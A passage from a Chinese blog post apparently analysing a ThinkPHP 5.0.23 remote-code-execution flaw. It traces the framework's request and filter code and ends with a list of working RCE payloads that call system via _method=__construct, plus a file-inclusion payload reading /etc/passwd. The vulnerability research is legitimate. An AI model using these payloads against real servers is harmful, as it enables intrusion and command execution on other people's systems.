class="line">27</span><br></pre></td><td class="code"><pre><span class="line">protected static function <span class="keyword">exec</span>($dispatch, $config)</span><br><span class="line">&#123;</span><br><span class="line">       switch ($dispatch[<span class="string">'type'</span>]) &#123;</span><br><span class="line">           case <span class="string">'redirect'</span>: <span class="regexp">//</span> 重定向跳转</span><br><span class="line">               $data = Response::create($dispatch[<span class="string">'url'</span>], <span class="string">'redirect'</span>)</span><br><span class="line">                   -&gt;code($dispatch[<span class="string">'status'</span>]);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           case <span class="string">'module'</span>: <span class="regexp">//</span> 模块/控制器/操作</span><br><span class="line">               $data = self::module(</span><br><span class="line">                   $dispatch[<span class="string">'module'</span>],</span><br><span class="line">                   $config,</span><br><span class="line">                   isset($dispatch[<span class="string">'convert'</span>]) ? $dispatch[<span class="string">'convert'</span>] : null</span><br><span class="line">               );</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           case <span class="string">'controller'</span>: <span class="regexp">//</span> 执行控制器操作</span><br><span class="line">               $vars = array_merge(Request::instance()-&gt;param(), $dispatch[<span class="string">'var'</span>]);</span><br><span class="line">               $data = Loader::action(</span><br><span class="line">                   $dispatch[<span class="string">'controller'</span>],</span><br><span class="line">                   $vars,</span><br><span class="line">                   $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">                   $config[<span class="string">'controller_suffix'</span>]</span><br><span class="line">               );</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           case <span class="string">'method'</span>: <span class="regexp">//</span> 回调方法</span><br><span class="line">               $vars = array_merge(Request::instance()-&gt;param(), $dispatch[<span class="string">'var'</span>]);</span><br><span class="line">               $data = self::invokeMethod($dispatch[<span class="string">'method'</span>], $vars);</span><br><span class="line">               <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
+<p>可以发现这里是根据$dispatch[‘type’]来进行选择进入哪一个分支，我们需要进入case ‘method’: 这一分支，那么根据前面的分析可以知道，必须控制$dispatch，也就是$dispatch[‘type’] = ‘method’ 才可以<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">s</span> = captcha </span><br><span class="line">array(<span class="number">3</span>) &#123; [<span class="string">"type"</span>]=&gt; string(<span class="number">6</span>) <span class="string">"method"</span> [<span class="string">"method"</span>]=&gt; array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">32</span>) <span class="string">"\think\captcha\CaptchaController"</span> [<span class="number">1</span>]=&gt; string(<span class="number">5</span>) <span class="string">"index"</span> &#125; [<span class="string">"var"</span>]=&gt; array(<span class="number">0</span>) &#123; &#125; &#125;</span><br></pre></td></tr></table></figure></p>
+<p>就比如直接时<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// <span class="regexp">/ -&gt;  &#123; ["type"]=&gt; string(6) "module" ["module"]=&gt; array(3) &#123; [0]=&gt; string(0) "" [1]=&gt; NULL [2]=&gt; NULL &#125; &#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>也就是说在 <a href="http://localhost:8888/think-5.0.23/public/index.php?s=captcha" target="_blank" rel="noopener">http://localhost:8888/think-5.0.23/public/index.php?s=captcha</a> 才可以，也就是问题一的答案，再配合上问题三就可以正确执行流程到这。<br>然后跟进Request::instance()-&gt;param()，获取当前请求参数，先获取请求方式<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function param($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">           $method = $this-&gt;method(true);</span><br></pre></td></tr></table></figure></p>
+<p>然后根据请求方式，自动获取请求变量，再当前请求参数和URL地址中的参数合并<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); <span class="regexp">//</span> $this-&gt;get+array(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; NULL &#125;</span><br></pre></td></tr></table></figure></p>
+<p>获取变量，支持过滤和默认值<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure></p>
+<p>以上是整个Request::instance()-&gt;param()函数的流程，那么先跟进$this-&gt;method(true)<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function method($method = false)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">if</span> (true === $method) &#123;</span><br><span class="line">           <span class="keyword">return</span> $this-&gt;server(<span class="string">'REQUEST_METHOD'</span>) ?: <span class="string">'GET'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>继续<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function server($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (empty($this-&gt;server)) &#123;</span><br><span class="line">            $this-&gt;server = $_SERVER;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $this-&gt;server = array_merge($this-&gt;server, $name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;input($this-&gt;server, false === $name ? false : strtoupper($name), $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>根据传入的payload可以知道$this-&gt;input的参数分别是<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload: server[REQUEST_METHOD]=whoami</span><br><span class="line">$this-&gt;server =  array(<span class="number">1</span>) &#123; [<span class="string">"REQUEST_METHOD"</span>]=&gt; string(<span class="number">6</span>) <span class="string">"whoami"</span> &#125;</span><br><span class="line">$name = REQUEST_METHOD </span><br><span class="line">$default = NULL </span><br><span class="line">$filter = <span class="string">''</span></span><br></pre></td></tr></table></figure></p>
+<p>那么<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public function input($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (false === $name) &#123;</span><br><span class="line">           // 获取原始数据</span><br><span class="line">           <span class="keyword">return</span> $data;</span><br><span class="line">       &#125;</span><br><span class="line">       $name = (string) $name;</span><br><span class="line">       <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">           // 解析name</span><br><span class="line">           <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">               list($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               $type = <span class="string">'s'</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           // 按.拆分成多维数组进行判断</span><br><span class="line">           <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) as $val) &#123;</span><br><span class="line">               print_r($data);</span><br><span class="line">               print_r(<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">               <span class="keyword">if</span> (isset($data[$val])) &#123; </span><br><span class="line">                   $data = $data[$val];</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   // 无输入数据，返回默认值</span><br><span class="line">                   <span class="keyword">return</span> $default  ;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">               <span class="keyword">return</span> $data;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里进入了if分支里面，处理了$data的值：$data = $data[$val]，也就是$data = $this-&gt;server[$name] = ‘whoami’，继续<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 解析过滤器</span><br><span class="line">$filter = $this-&gt;getFilter($filter, $default); </span><br><span class="line">// $default = NULL </span><br><span class="line">// $filter = <span class="string">''</span></span><br></pre></td></tr></table></figure></p>
+<p>跟进$this-&gt;getFilter<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">           $filter = [];</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $filter = $filter ?: $this-&gt;filter;</span><br><span class="line">           <span class="keyword">if</span> (is_string($filter) &amp;&amp; false === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">               $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               $filter = (array) $filter;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       $filter[] = $default;</span><br><span class="line">       <span class="keyword">return</span> $filter;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>将$filter赋值为$this-&gt;filter，然后 $filter = (array) $filter; 再 $filter[] = $default; 添加$default 然后在filterValue函数中array_pop出来，最后return $filte，这样看来传入filter = system 和 filter[] = system其实效果是一样的。回到上一层input函数中。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [$this, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">    <span class="keyword">reset</span>($data);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $this-&gt;filterValue($data, $name, $filter); </span><br><span class="line">&#125;</span><br><span class="line">// $data = <span class="string">'whoami'</span></span><br><span class="line">// $name = <span class="string">'REQUEST_METHOD'</span></span><br><span class="line">// $filter = array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">6</span>) <span class="string">"system"</span> [<span class="number">1</span>]=&gt; NULL &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，如果按照这个payload来，$data是一个字符串whoami，因此进入else的分支<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function filterValue(&amp;$value, $key, $filters) //&amp;$value</span><br><span class="line">&#123;</span><br><span class="line">       $default = array_pop($filters);</span><br><span class="line">       <span class="keyword">foreach</span> ($filters as $filter) &#123;</span><br><span class="line">           <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">               // 调用函数或者方法过滤</span><br><span class="line">               $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure></p>
+<p>先array_pop($filters)，此时$filters里面就是只剩下array(1) {   [0]=&gt;   string(6) “system” }，然后foreach遍历后$filter就是’system’，而且可以进入if分支，执行回调函数call_user_func(‘system’,’whoami’)。<br>那么另一个payload的差别就是get[] = whoami上。这得回到request::param函数中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> param(<span class="variable">$name</span> = <span class="string">''</span>, <span class="variable">$default</span> = null, <span class="variable">$filter</span> = <span class="string">''</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (empty(<span class="variable">$this</span>-&gt;mergeParam)) &#123;</span><br><span class="line">           <span class="variable">$method</span> = <span class="variable">$this</span>-&gt;method(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p>
+<p>依然是执行$this-&gt;method(true)，然后直接看返回的内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> method(<span class="variable">$method</span> = <span class="literal">false</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$method</span>) &#123;</span><br><span class="line">           <span class="built_in">return</span> <span class="variable">$this</span>-&gt;server(<span class="string">'REQUEST_METHOD'</span>) ?: <span class="string">'GET'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>此时$this-&gt;server(‘REQUEST_METHOD’) 返回是 NULL ，也就是$method = ‘get’ ，在switch中进入default，之后就是当前请求参数和URL地址中的参数合并。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$this</span>-&gt;param      = array_merge(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;route(<span class="literal">false</span>));</span><br></pre></td></tr></table></figure></p>
+<p>进入$this-&gt;get(false)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> get(<span class="variable">$name</span> = <span class="string">''</span>, <span class="variable">$default</span> = null, <span class="variable">$filter</span> = <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">if</span> (empty(<span class="variable">$this</span>-&gt;get)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;get = <span class="variable">$_GET</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;param      = [];</span><br><span class="line">           <span class="variable">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">           <span class="built_in">return</span> <span class="variable">$this</span>-&gt;get = array_merge(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$this</span>-&gt;input(<span class="variable">$this</span>-&gt;get, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>获取get的值，因为$name = ‘’ ，所以input函数直接return $this-&gt;get，那么可以看到此时$this-&gt;param的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array(0) &#123; &#125; + <span class="variable">$this</span>-&gt;get + [] + array(1) &#123; [<span class="string">"id"</span>]=&gt; NULL &#125;</span><br><span class="line">= &gt; </span><br><span class="line">array(2) &#123; [0]=&gt; string(6) <span class="string">"whoami"</span> [<span class="string">"id"</span>]=&gt; NULL &#125;</span><br></pre></td></tr></table></figure></p>
+<p>继续<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> <span class="variable">$this</span>-&gt;input(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>); </span><br><span class="line">// <span class="variable">$this</span>-&gt;param = array(2) &#123; [0]=&gt; string(6) <span class="string">"whoami"</span> [<span class="string">"id"</span>]=&gt; NULL &#125; </span><br><span class="line">// <span class="variable">$name</span> = <span class="string">''</span></span><br><span class="line">// <span class="variable">$default</span> = null, </span><br><span class="line">// <span class="variable">$filter</span> = <span class="string">''</span></span><br></pre></td></tr></table></figure></p>
+<p>跟进，前面的流程上面已经分析了，直接到这个if分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">   array_walk_recursive(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">'filterValue'</span>], <span class="variable">$filter</span>);</span><br><span class="line">   reset(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure></p>
+<p>因为$data是数组，就调用array_walk_recursive函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive ( array &amp;<span class="variable">$array</span> , callable <span class="variable">$callback</span> , mixed <span class="variable">$userdata</span> = null ) : bool</span><br><span class="line">array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数，对数组中的每个成员递归地应用用户函数。</span><br></pre></td></tr></table></figure></p>
+<p>因此执行第一次filterValue函数的时候是这样的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterValue(<span class="string">'whoami'</span>, 0, array(2) &#123; [0]=&gt; string(6) <span class="string">"system"</span> [1]=&gt; NULL &#125;)</span><br></pre></td></tr></table></figure></p>
+<p>第二次执行的时候<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filterValue(NULL, <span class="number">1</span>, array(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; string(<span class="number">6</span>) <span class="string">"system"</span> [<span class="number">1</span>]=&gt; NULL &#125;)</span><br></pre></td></tr></table></figure></p>
+<p>会出现报错：system(): Cannot execute a blank command，如果开去app_debug<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12939721/1618142998672-82148896-edc7-4acd-bb3d-0ce411e8367c.jpeg#align=left&amp;display=inline&amp;height=816&amp;margin=%5Bobject%20Object%5D&amp;name=image.jpeg&amp;originHeight=816&amp;originWidth=1694&amp;size=521908&amp;status=done&amp;style=none&amp;width=1694" alt="image.jpeg"><br>看栈信息也能发现<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Call Stack</span><br><span class="line">    in Request.php line <span class="number">1139</span></span><br><span class="line">    at Error::appError(<span class="number">2</span>, <span class="string">'system(): Cannot exe...'</span>, <span class="string">'/Applications/MAMP/h...'</span>, <span class="number">1139</span>, [<span class="string">'value'</span> =&gt; null, <span class="string">'key'</span> =&gt; <span class="string">'id'</span>, <span class="string">'filters'</span> =&gt; [<span class="string">'system'</span>], ...])</span><br><span class="line">    at <span class="keyword">system</span>(<span class="string">''</span>)</span><br><span class="line">    at call_user_func(<span class="string">'system'</span>, null) in Request.php line <span class="number">1139</span></span><br><span class="line">    at Request-&gt;filterValue(null, <span class="string">'id'</span>, [<span class="string">'system'</span>, null])</span><br><span class="line">    at array_walk_recursive([<span class="string">'xxhx'</span>, <span class="string">'id'</span> =&gt; null], [object(Request), <span class="string">'filterValue'</span>], [<span class="string">'system'</span>, null]) in Request.php line <span class="number">1060</span></span><br><span class="line">    at Request-&gt;input([<span class="string">'whoami'</span>, <span class="string">'id'</span> =&gt; null], <span class="string">''</span>, null, <span class="string">''</span>) in Request.php line <span class="number">677</span></span><br><span class="line">    at Request-&gt;param() in App.php line <span class="number">130</span></span><br><span class="line">    at App::run() in start.php line <span class="number">19</span></span><br><span class="line">    at <span class="keyword">require</span>(<span class="string">'/Applications/MAMP/h...'</span>) in index.php line <span class="number">17</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="payload大全"><a href="#payload大全" class="headerlink" title="payload大全"></a>payload大全</h2><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//localhost</span>:<span class="number">8888</span>/think-<span class="number">5.0</span>.<span class="number">23</span>/public/index.php?<span class="keyword">s</span>=captcha</span><br><span class="line">_method=__construct&amp;filter[]=<span class="keyword">system</span>&amp;method=get&amp;server[HTTP_HOST]=whoami</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//localhost</span>:<span class="number">8888</span>/think-<span class="number">5.0</span>.<span class="number">23</span>/public/index.php?<span class="keyword">s</span>=captcha</span><br><span class="line">_method=__construct&amp;filter=<span class="keyword">system</span>&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//localhost</span>:<span class="number">8888</span>/think-<span class="number">5.0</span>.<span class="number">23</span>/public/index.php?<span class="keyword">s</span>=captcha</span><br><span class="line">_method=__construct&amp;filter[]=<span class="keyword">system</span>&amp;method=get&amp;get[]=whoami</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//localhost</span>:<span class="number">8888</span>/think-<span class="number">5.0</span>.<span class="number">23</span>/public/index.php?<span class="keyword">s</span>=captcha&amp;xxx=whoami</span><br><span class="line">_method=__construct&amp;filter[]=<span class="keyword">system</span>&amp;method=get</span><br></pre></td></tr></table></figure>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>在大多数情况下网站都会禁用system等危险函数，而上面的payload都是单参数的，无法调用file_put_contents进行任意文件写。Thinkphp基础文件base.php一开始就包含/thinkphp/library/think/Loader.php文件，其中有个__include_file函数<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//localhost</span>:<span class="number">8888</span>/think-<span class="number">5.0</span>.<span class="number">23</span>/public/index.php?<span class="keyword">s</span>=captcha</span><br><span class="line">_method=__construct&amp;method=GET&amp;filter[]=think\\__include_file&amp;server[]=<span class="number">1</span>&amp;get[]=<span class="regexp">/etc/passwd</span></span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+	<div>
+      
+          <div>
+     
+        <div style="text-align:center;color: #ccc;font-size:15px;">
+              -------------本文结束&感谢您的阅读-------------
+        </div>
+</div>
+      
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    bey0ndm3
+  </li>
+    <li class="post-copyright-author">
+    <strong>Post title:</strong>
+    <a href="/2021/04/02/1/">thinkphp 5.0.23 rce 分析</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>Publishing time:</strong>
+    2021年04月02日 - 16:04
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://1234xxh.github.io/2021/04/02/1/" title="thinkphp 5.0.23 rce 分析">http://1234xxh.github.io/2021/04/02/1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+  <li>转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/25/1/" rel="next" title="栈溢出技巧(四)">
+                <i class="fa fa-chevron-left"></i> 栈溢出技巧(四)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODU3Ni8xNTEwNA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/background.jpg"
+                alt="bey0ndm3" />
+            
+              <p class="site-author-name" itemprop="name">bey0ndm3</p>
+              <p class="site-description motion-element" itemprop="description">我的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/virgilwjj/" title="virgilwjj" target="_blank">virgilwjj</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
